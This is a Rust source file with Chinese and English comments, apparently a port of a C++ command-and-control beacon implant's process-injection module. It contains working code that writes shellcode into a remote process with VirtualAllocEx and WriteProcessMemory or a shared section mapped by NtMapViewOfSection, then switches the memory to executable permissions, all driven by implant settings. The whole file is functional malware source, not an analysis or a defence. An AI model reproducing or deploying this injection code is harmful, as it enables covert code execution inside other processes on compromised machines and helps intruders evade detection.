//! 移植自 src/inject_mirror.cpp —— 与生成并注入 shellcode 相关的函数：
//! 将 shellcode 镜像到本地或远程内存（VirtualAllocEx 或 NtMapViewOfSection），
//! 并最终确定页权限。
//! Port of src/inject_mirror.cpp — functions related to spawning and
//! injecting shellcode: mirror the shellcode into local or remote memory
//! (VirtualAllocEx or NtMapViewOfSection) and finalize page permissions.

use crate::beacon::{
    SETTING_PROCINJ_ALLOCATOR, SETTING_PROCINJ_MINALLOC, SETTING_PROCINJ_PERMS,
    SETTING_PROCINJ_PERMS_I,
};
use crate::callback::{post_error_d, post_error_dd};
use crate::inject::InjectContext;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    CreateFileMappingA, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx,
    VirtualFree, VirtualProtect, VirtualProtectEx, FILE_MAP_ALL_ACCESS, MEMORY_MAPPED_VIEW_ADDRESS,
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};

// 在 C++（inject_mirror.cpp）中定义，但那里也从未比较过；
// virtualalloc 分支是兜底的默认分支。
// Defined in the C++ (inject_mirror.cpp) but never compared there either;
// the virtualalloc branch is the fall-through default.
#[allow(dead_code)]
const ALLOCATOR_VIRTUALALLOCEX: u16 = 0;
const ALLOCATOR_NTMAPVIEWOFSECTION: u16 = 1;

/// SECTION_INHERIT 枚举中的 ViewShare。
/// SECTION_INHERIT::ViewShare.
const VIEW_SHARE: i32 = 1;

/// NtMapViewOfSection 的函数原型：
/// NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG, SIZE_T,
/// PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG)。
/// NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG, SIZE_T,
/// PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG).
type NtMapViewOfSection = unsafe extern "system" fn(
    HANDLE,
    HANDLE,
    *mut *mut c_void,
    u32,
    usize,
    *const c_void,
    *mut usize,
    i32,
    u32,
    u32,
) -> i32;

/// 通过 NtMapViewOfSection 映射的节将 `buffer` 镜像到远程进程
/// （remote_mirror_data_ntmapviewofsection）。
/// Mirror `buffer` into the remote process via a section mapped with
/// NtMapViewOfSection (remote_mirror_data_ntmapviewofsection).
pub fn remote_mirror_data_ntmapviewofsection(h_process: isize, _pid: u32, buffer: &[u8], length: usize) -> *mut u8 {
    let length = length.min(buffer.len());
    let mut ctx_remote: *mut c_void = std::ptr::null_mut();

    unsafe {
        // 确定我们要分配的最小长度。
        /* determine the minimum length we want to allocate */
        let mut allocsz = crate::settings::setting_int(SETTING_PROCINJ_MINALLOC) as usize;
        if length > allocsz {
            allocsz = length;
        }

        // 尝试获取这个函数。
        /* try to get this function */
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() {
            return std::ptr::null_mut();
        }
        let Some(p_nt_map_view_of_section) = GetProcAddress(ntdll, b"NtMapViewOfSection\0".as_ptr()) else {
            return std::ptr::null_mut();
        };
        let p_nt_map_view_of_section: NtMapViewOfSection = std::mem::transmute(p_nt_map_view_of_section);

        // 创建我们的节。
        /* create our section */
        let h_file = CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            std::ptr::null(),
            PAGE_EXECUTE_READWRITE,
            0,
            allocsz as u32,
            std::ptr::null(),
        );
        let mut ctx_local: *mut c_void = std::ptr::null_mut();

        if h_file != INVALID_HANDLE_VALUE {
            // 将其映射到当前进程。
            /* map it into the current process */
            ctx_local = MapViewOfFile(h_file, FILE_MAP_ALL_ACCESS, 0, 0, 0).Value;
            if !ctx_local.is_null() {
                // 把我们的数据复制到节中。
                /* copy our data to the section */
                std::ptr::copy_nonoverlapping(buffer.as_ptr(), ctx_local as *mut u8, length);

                // 现在把节映射到远程进程。
                /* map our section in the remote process now */
                let mut v_size: usize = 0;
                p_nt_map_view_of_section(
                    h_file,
                    h_process as HANDLE,
                    &mut ctx_remote,
                    0,
                    0,
                    std::ptr::null(),
                    &mut v_size,
                    VIEW_SHARE,
                    0,
                    crate::settings::setting_short(SETTING_PROCINJ_PERMS) as u32,
                );
            }
        }

        // 清理。
        /* clean up */
        if !ctx_local.is_null() {
            UnmapViewOfFile(MEMORY_MAPPED_VIEW_ADDRESS { Value: ctx_local });
        }
        if h_file != INVALID_HANDLE_VALUE {
            CloseHandle(h_file);
        }

        // 如果确实失败了，就报告失败。
        /* report failure if we indeed failed */
        if ctx_remote.is_null() {
            post_error_d(0x49, GetLastError() as i32);
        }
    }

    ctx_remote as *mut u8
}

/// 使用 VirtualAllocEx + WriteProcessMemory 将 `buffer` 镜像到远程进程
/// （remote_mirror_data_virtualallocex）。
/// Mirror `buffer` into the remote process with VirtualAllocEx +
/// WriteProcessMemory (remote_mirror_data_virtualallocex).
pub fn remote_mirror_data_virtualallocex(h_process: isize, _pid: u32, buffer: &[u8], length: usize) -> *mut u8 {
    let length = length.min(buffer.len());
    unsafe {
        let mut allocsz = crate::settings::setting_int(SETTING_PROCINJ_MINALLOC) as usize;
        if length > allocsz {
            allocsz = length;
        }
        let perms_i = crate::settings::setting_short(SETTING_PROCINJ_PERMS_I) as u32;
        let perms = crate::settings::setting_short(SETTING_PROCINJ_PERMS) as u32;

        // 在我们的进程中分配内存。
        /* allocate memory in our process */
        let ptr = VirtualAllocEx(
            h_process as HANDLE,
            std::ptr::null(),
            allocsz,
            MEM_RESERVE | MEM_COMMIT,
            perms_i,
        );
        if ptr.is_null() {
            post_error_dd(0x1f, allocsz as i32, GetLastError() as i32);
            return std::ptr::null_mut();
        }

        // 将我们的 shellcode 写入进程。
        /* write our shellcode to the process */
        let mut total: usize = 0;
        while total < length {
            let mut wrote: usize = 0;
            if WriteProcessMemory(
                h_process as HANDLE,
                (ptr as *mut u8).add(total) as *const c_void,
                buffer.as_ptr().add(total) as *const c_void,
                length - total,
                &mut wrote,
            ) == 0
            {
                post_error_d(0x10, GetLastError() as i32);
                VirtualFree(ptr, 0, MEM_RELEASE);
                return std::ptr::null_mut();
            }

            total += wrote;

            if wrote == 0 {
                VirtualFree(ptr, 0, MEM_RELEASE);
                return std::ptr::null_mut();
            }
        }

        // 现在让数据可执行。
        /* make the data executable now */
        if perms_i != perms {
            let mut old: u32 = 0;
            if VirtualProtectEx(h_process as HANDLE, ptr, allocsz, perms, &mut old) == 0 {
                post_error_d(0x11, GetLastError() as i32);
                VirtualFree(ptr, 0, MEM_RELEASE);
                return std::ptr::null_mut();
            }
        }

        ptr as *mut u8
    }
}

/// 使用 VirtualAlloc 将 `buffer` 镜像到本地进程
/// （local_mirror_data；finalize_memory_permissions 之后为 RX 页）。
/// 调用方负责释放已分配的内存。
/// Mirror `buffer` into the local process with VirtualAlloc
/// (local_mirror_data; RX pages after finalize_memory_permissions).
/// The caller is responsible for the allocated memory.
pub fn local_mirror_data(buffer: &[u8], length: usize) -> *mut u8 {
    let length = length.min(buffer.len());
    unsafe {
        let mut allocsz = crate::settings::setting_int(SETTING_PROCINJ_MINALLOC) as usize;
        if length > allocsz {
            allocsz = length + 1024;
        }
        let perms_i = crate::settings::setting_short(SETTING_PROCINJ_PERMS_I) as u32;

        // 在我们的进程中分配内存。
        /* allocate memory in our process */
        let ptr = VirtualAlloc(std::ptr::null(), allocsz, MEM_RESERVE | MEM_COMMIT, perms_i);
        if ptr.is_null() {
            post_error_dd(0x1f, allocsz as i32, GetLastError() as i32);
            return std::ptr::null_mut();
        }

        // 把我们的 shellcode 复制到正确的位置。
        /* copy our shellcode to the right spot */
        std::ptr::copy_nonoverlapping(buffer.as_ptr(), ptr as *mut u8, length);

        // 处理我们的权限……最后一次。
        /* handle our permissions... one last time */
        if finalize_memory_permissions(ptr as *mut u8, allocsz) {
            ptr as *mut u8
        } else {
            VirtualFree(ptr, 0, MEM_RELEASE);
            std::ptr::null_mut()
        }
    }
}

/// 现在让数据可执行（finalize_memory_permissions）。
/// Make the data executable now (finalize_memory_permissions).
pub fn finalize_memory_permissions(ptr: *mut u8, length: usize) -> bool {
    unsafe {
        let perms_i = crate::settings::setting_short(SETTING_PROCINJ_PERMS_I) as u32;
        let perms = crate::settings::setting_short(SETTING_PROCINJ_PERMS) as u32;

        if perms_i == perms {
            return true;
        }

        let mut old: u32 = 0;
        if VirtualProtect(ptr as *const c_void, length, perms, &mut old) == 0 {
            post_error_d(0x11, GetLastError() as i32);
            return false;
        }

        true
    }
}

/// 将 `buffer` 镜像到目标进程，根据 SETTING_PROCINJ_ALLOCATOR 选择分配器
/// （remote_mirror_data）。调用方负责释放已分配的内存。
/// Mirror `buffer` into the target process, choosing the allocator from
/// SETTING_PROCINJ_ALLOCATOR (remote_mirror_data). The caller is
/// responsible for the allocated memory.
pub fn remote_mirror_data(context: &mut InjectContext, buffer: &[u8], length: usize) -> *mut u8 {
    let option = crate::settings::setting_short(SETTING_PROCINJ_ALLOCATOR);
    if option == ALLOCATOR_NTMAPVIEWOFSECTION && context.same_arch {
        return remote_mirror_data_ntmapviewofsection(context.h_process, context.pid, buffer, length);
    }

    remote_mirror_data_virtualallocex(context.h_process, context.pid, buffer, length)
}
